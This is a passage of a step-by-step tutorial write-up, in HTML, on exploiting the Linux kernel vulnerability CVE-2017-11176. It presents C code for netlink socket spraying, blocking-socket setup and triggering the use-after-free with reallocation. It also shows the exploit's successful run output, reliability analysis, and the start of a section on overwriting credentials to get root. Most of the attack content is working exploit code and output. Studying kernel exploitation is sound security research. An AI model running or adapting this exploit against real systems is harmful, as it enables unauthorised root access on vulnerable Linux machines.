<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">found</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="c1">// reset sock_fd to release them</span>
<span class="w">    </span><span class="n">guard</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// we didn't found any valid candidates, release and quit</span>
<span class="w">  </span><span class="k">goto</span><span class="w"> </span><span class="n">release_pids</span><span class="p">;</span><span class="w"></span>

<span class="nl">found</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] adjacent candidates found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// we succeed</span>

<span class="nl">release_pids</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_SOCK_PID_SPRAY</span><span class="p">;</span><span class="w"> </span><span class="c1">// reset the candidate counter for release</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pids</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">pids</span><span class="p">);</span><span class="w"></span>

<span class="nl">release_candidates</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">--</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">// do not release the target/guard sockets</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">candidates</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">        </span><span class="p">(</span><span class="n">candidates</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">guard</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">close</span><span class="p">(</span><span class="n">candidates</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"> </span>
</code></pre></div><p>Because of the new <em>create_netlink_candidate()</em> function, we won't use the previous <em>prepare_blocking_socket()</em> function anymore. However, we still need to make our target block by filling its receive buffer. In addition, we will use the "guard" to fill it. This is implemented in <em>fill_receive_buffer()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">fill_receive_buffer</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="o">*</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="o">*</span><span class="n">guard</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="o">*</span><span class="mi">10</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">new_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// this will be reset to SOCK_MIN_RCVBUF</span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="c1">// use the target's pid</span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="c1">// no groups</span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">iovec</span><span class="w"> </span><span class="n">iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="n">mhdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_namelen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_iovlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_control</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_controllen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] preparing blocking netlink socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">SO_RCVBUF</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">new_size</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">new_size</span><span class="p">)))</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] setsockopt"</span><span class="p">);</span><span class="w"> </span><span class="c1">// no worry if it fails, it is just an optim.</span>
<span class="w">  </span><span class="k">else</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] receive buffer reduced</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] flooding socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">_sendmsg</span><span class="p">(</span><span class="n">guard</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mhdr</span><span class="p">,</span><span class="w"> </span><span class="n">MSG_DONTWAIT</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EAGAIN</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] sendmsg"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] flood completed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] blocking socket ready</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to prepare blocking socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Let's edit the <em>main()</em> function to call <em>find_netlink_candidates()</em> after initializing the reallocation. Note that we do not use the <strong>sock_fd</strong> variable anymore but the <em>g_target.sock_fd</em>. Both <em>g_target</em> and <em>g_guard</em> are declared globally, so we can use them in <em>payload()</em>. Also, remember to <strong>close the guard AFTER the reallocation</strong> to handle the "scenario 1" (guard is adjacent to target):</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="n">g_target</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="n">g_guard</span><span class="p">;</span><span class="w"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] reallocation ready!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">find_netlink_candidates</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_target</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">g_guard</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to find netlink candidates</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink candidates ready:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] target.pid = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">g_target</span><span class="p">.</span><span class="n">pid</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] guard.pid  = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">g_guard</span><span class="p">.</span><span class="n">pid</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fill_receive_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g_target</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">g_guard</span><span class="p">))</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(((</span><span class="n">unblock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_dup</span><span class="p">(</span><span class="n">g_target</span><span class="p">.</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"></span>
<span class="w">      </span><span class="p">((</span><span class="n">sock_fd2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_dup</span><span class="p">(</span><span class="n">g_target</span><span class="p">.</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] dup"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">sock_fd2</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// trigger the bug twice AND immediatly realloc!</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">decrease_sock_refcounter</span><span class="p">(</span><span class="n">g_target</span><span class="p">.</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"></span>
<span class="w">      </span><span class="n">decrease_sock_refcounter</span><span class="p">(</span><span class="n">sock_fd2</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">realloc_NOW</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="c1">// close it before invoking the arbitrary call</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] closing guard socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">g_guard</span><span class="p">.</span><span class="n">sock_fd</span><span class="p">);</span><span class="w">                       </span><span class="c1">// &lt;----- !</span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Nice, it is time for a crash test!</p><div class="highlight"><pre><span></span><code>$ ./exploit
<span class="o">[</span> <span class="o">]</span> -<span class="o">={</span> CVE-2017-11176 Exploit <span class="o">}=</span>-
<span class="o">[</span>+<span class="o">]</span> successfully migrated to CPU#0
<span class="o">[</span>+<span class="o">]</span> userland structures allocated:
<span class="o">[</span>+<span class="o">]</span> <span class="nv">g_uland_wq_elt</span> <span class="o">=</span> 0x120001000
<span class="o">[</span>+<span class="o">]</span> <span class="nv">g_fake_stack</span>   <span class="o">=</span> 0x20001000
<span class="o">[</span>+<span class="o">]</span> ROP-chain ready
<span class="o">[</span> <span class="o">]</span> <span class="nv">optmem_max</span> <span class="o">=</span> <span class="m">20480</span>
<span class="o">[</span>+<span class="o">]</span> can use the <span class="s1">'ancillary data buffer'</span> reallocation gadget!
<span class="o">[</span>+<span class="o">]</span> g_uland_wq_elt.func <span class="o">=</span> 0xffffffff8107b6b8
<span class="o">[</span>+<span class="o">]</span> reallocation data initialized!
<span class="o">[</span> <span class="o">]</span> initializing reallocation threads, please wait...
<span class="o">[</span>+<span class="o">]</span> <span class="m">200</span> reallocation threads ready!
<span class="o">[</span>+<span class="o">]</span> reallocation ready!
<span class="o">[</span>+<span class="o">]</span> <span class="m">300</span> candidates created
<span class="o">[</span>+<span class="o">]</span> parsing <span class="s1">'/proc/net/netlink'</span> <span class="nb">complete</span>
<span class="o">[</span>+<span class="o">]</span> adjacent candidates found!
<span class="o">[</span>+<span class="o">]</span> netlink candidates ready:
<span class="o">[</span>+<span class="o">]</span> target.pid <span class="o">=</span> -5723
<span class="o">[</span>+<span class="o">]</span> guard.pid  <span class="o">=</span> -5708
<span class="o">[</span> <span class="o">]</span> preparing blocking netlink socket
<span class="o">[</span>+<span class="o">]</span> receive buffer reduced
<span class="o">[</span> <span class="o">]</span> flooding socket
<span class="o">[</span>+<span class="o">]</span> flood completed
<span class="o">[</span>+<span class="o">]</span> blocking socket ready
<span class="o">[</span>+<span class="o">]</span> netlink fd duplicated <span class="o">(</span><span class="nv">unblock_fd</span><span class="o">=</span><span class="m">403</span>, <span class="nv">sock_fd2</span><span class="o">=</span><span class="m">404</span><span class="o">)</span>
<span class="o">[</span> <span class="o">]</span> creating unblock thread...
<span class="o">[</span>+<span class="o">]</span> unblocking thread has been created!
<span class="o">[</span> <span class="o">]</span> get ready to block
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> closing <span class="m">468</span> fd
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> unblocking now
<span class="o">[</span>+<span class="o">]</span> mq_notify succeed
<span class="o">[</span> <span class="o">]</span> creating unblock thread...
<span class="o">[</span>+<span class="o">]</span> unblocking thread has been created!
<span class="o">[</span> <span class="o">]</span> get ready to block
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> closing <span class="m">404</span> fd
<span class="o">[</span> <span class="o">][</span>unblock<span class="o">]</span> unblocking now
<span class="o">[</span>+<span class="o">]</span> mq_notify succeed
<span class="o">[</span> <span class="o">]</span> closing guard socket
<span class="o">[</span> <span class="o">]</span> <span class="nv">addr_len</span> <span class="o">=</span> <span class="m">12</span>
<span class="o">[</span> <span class="o">]</span> addr.nl_pid <span class="o">=</span> <span class="m">296082670</span>
<span class="o">[</span> <span class="o">]</span> <span class="nv">magic_pid</span> <span class="o">=</span> <span class="m">296082670</span>
<span class="o">[</span>+<span class="o">]</span> reallocation succeed! Have fun :-<span class="o">)</span>
<span class="o">[</span> <span class="o">]</span> invoking arbitrary call primitive...
<span class="o">[</span>+<span class="o">]</span> arbitrary call succeed!
<span class="o">[</span>+<span class="o">]</span> exploit complete!
$ cat /proc/net/netlink                                                                                     
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops
ffff88001eb47800 <span class="m">0</span>   <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001fa66800 <span class="m">6</span>   <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001966ac00 <span class="m">9</span>   <span class="m">1125</span>   <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001a2a0800 <span class="m">9</span>   <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001e24f400 <span class="m">10</span>  <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001e0a2c00 <span class="m">11</span>  <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001f492c00 <span class="m">15</span>  <span class="m">480</span>    <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001f492400 <span class="m">15</span>  <span class="m">479</span>    <span class="m">00000001</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001f58f800 <span class="m">15</span>  -4154  <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001eb47000 <span class="m">15</span>  <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001e0fe000 <span class="m">16</span>  <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff88001e0fe400 <span class="m">18</span>  <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff8800196bf800 <span class="m">31</span>  <span class="m">1322</span>   <span class="m">00000001</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
ffff880019698000 <span class="m">31</span>  <span class="m">0</span>      <span class="m">00000000</span> <span class="m">0</span>        <span class="m">0</span>        <span class="o">(</span>null<span class="o">)</span> <span class="m">2</span>        <span class="m">0</span>       
</code></pre></div><p><strong>EUREKA!</strong></p><p><strong>NO MORE CRASH!</strong></p><p><strong>THE KERNEL IS REPAIRED!</strong></p><p><strong>THE EXPLOIT WAS SUCCESSFUL!</strong></p><p><strong>WE ARE DONE!</strong></p><p>W00t! We can breathe now...</p><p>Hopefully, we repaired "everything" and didn't forget any dangling pointer or other stuff. No one is perfect...</p><p>So, what's next? Before going into the "profit" stage of the exploit, we would like to get back a bit to explain why we released the netlink sockets in <em>find_netlink_candidates()</em>.</p><hr><h1 id="reliability">Reliability</h1><p>As mentioned in the previous section, we overlooked the fact that we spray and release the netlink candidates in <em>find_netlink_candidates()</em>. The reason why we do this is to <strong>improve the exploit reliability</strong>.</p><p>Let's enumerate what can go wrong with this exploit (considering you didn't mess up with <em>hardcoded</em> offsets/addresses):</p><ul><li>The reallocation fails</li><li>A concurrent binary (or the kernel itself) tries to walk our target's bucket list</li></ul><p>As stated in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>, improving reallocation is a complex topic. You really need to understand the memory subsystem in detail if you want to find a way to get a better reallocation success rate. This is out-of-topic. What we did in part 3 is simply a "heap spraying" in combination with CPU fixation. It will work "most of the time", but there is room for improvement. Fortunately, our object lives in the <em>kmalloc-1024</em>, a <em>not-so-used</em> kmemcache.</p><p>In the "Repair the Kernel" section, we saw that our target's bucket list can be walked in two cases:</p><ol><li>a netlink socket has a pid which <strong>collides</strong> with our target's bucket</li><li>a <strong>dilution</strong> occurs, the kernel walk every bucket list</li></ol><p>In both cases, until we repair the kernel, this will provoke a NULL-deref because we do not control the first field of our reallocation data (hence <em>next</em> is 1024, a non NULL value).</p><p>To minimize both the risk of a dilution and a collision we create (and autobind) a lot of netlink sockets. The more bucket there is, the less are the chances a collision happens. Hopefully, the Jenkins Hash function produces "uniform" values so we have something like "1 / (nb_buckets)" probability that a collision occurs during an insertion.</p><p><strong>With 256 buckets, we have a 0.4% probability that such collision occurs</strong>. This is "acceptable".</p><p>Next, come the "dilution" issue. A dilution happens in two cases:</p><ol><li>The hash table grows</li><li>Insertion into a "charged" bucket (i.e. collision)</li></ol><p>We already deal with 2), see above.</p><p>In order to deal with 1), we <strong>preemptively make it grow</strong> by allocating a lot of netlink socket. And because the hash table is <strong>never shrinked</strong> by releasing all those sockets (but our target/guard) the table is mostly empty.</p><p><strong>That is, we can only be screwed if another program is using <em>NETLINK_USERSOCK</em> intensively (it can use other netlink protocol freely) with a lot of different sockets AND all of them are bound!</strong> How to compute the probability? Well... you never know what other programs are running... It's part of the game!</p><p>We could play, with "/proc/net/netlink" to check the utilization and decide whether or not to run the exploit, do some statistics analysis, etc.</p><p>The following diagram shows a "danger" map of things that can crash the kernel in the course of the exploit:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/danger_map.png" title="Exploit Danger Map"><figcaption class="figcaption figure-caption text-center">danger_map.png</figcaption></figure><p></p><hr><h1 id="getting-root">Getting root</h1><p>What we will do here is to get root.</p><p>Depending on your motivations, you can do many more in ring-0 than in ring-3 (escaping container/vm/trustzone, patching the kernel, extract/scan memory/secrets, etc...), but people like the <em>mighty #</em>... :-)</p><p>So, from our "unprivileged" user point-of-view this is a privilege escalation. However, considering we can now execute arbitrary code in ring-0, going back to ring-3 is actually a privilege de-escalation.</p><p>What defines the privilege of a task in Linux? The <strong>struct cred</strong>:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">atomic_t</span><span class="w">    </span><span class="n">usage</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="w">    </span><span class="kt">uid_t</span><span class="w">       </span><span class="n">uid</span><span class="p">;</span><span class="w">        </span><span class="cm">/* real UID of the task */</span><span class="w"></span>
<span class="w">    </span><span class="kt">gid_t</span><span class="w">       </span><span class="n">gid</span><span class="p">;</span><span class="w">        </span><span class="cm">/* real GID of the task */</span><span class="w"></span>
<span class="w">    </span><span class="kt">uid_t</span><span class="w">       </span><span class="n">suid</span><span class="p">;</span><span class="w">       </span><span class="cm">/* saved UID of the task */</span><span class="w"></span>
<span class="w">    </span><span class="kt">gid_t</span><span class="w">       </span><span class="n">sgid</span><span class="p">;</span><span class="w">       </span><span class="cm">/* saved GID of the task */</span><span class="w"></span>
<span class="w">    </span><span class="kt">uid_t</span><span class="w">       </span><span class="n">euid</span><span class="p">;</span><span class="w">       </span><span class="cm">/* effective UID of the task */</span><span class="w"></span>
<span class="w">    </span><span class="kt">gid_t</span><span class="w">       </span><span class="n">egid</span><span class="p">;</span><span class="w">       </span><span class="cm">/* effective GID of the task */</span><span class="w"></span>
<span class="w">    </span><span class="kt">uid_t</span><span class="w">       </span><span class="n">fsuid</span><span class="p">;</span><span class="w">      </span><span class="cm">/* UID for VFS ops */</span><span class="w"></span>
<span class="w">    </span><span class="kt">gid_t</span><span class="w">       </span><span class="n">fsgid</span><span class="p">;</span><span class="w">      </span><span class="cm">/* GID for VFS ops */</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w">    </span><span class="n">securebits</span><span class="p">;</span><span class="w"> </span><span class="cm">/* SUID-less security management */</span><span class="w"></span>
<span class="w">    </span><span class="n">kernel_cap_t</span><span class="w">    </span><span class="n">cap_inheritable</span><span class="p">;</span><span class="w"> </span><span class="cm">/* caps our children can inherit */</span><span class="w"></span>
<span class="w">    </span><span class="n">kernel_cap_t</span><span class="w">    </span><span class="n">cap_permitted</span><span class="p">;</span><span class="w">  </span><span class="cm">/* caps we're permitted */</span><span class="w"></span>
<span class="w">    </span><span class="n">kernel_cap_t</span><span class="w">    </span><span class="n">cap_effective</span><span class="p">;</span><span class="w">  </span><span class="cm">/* caps we can actually use */</span><span class="w"></span>
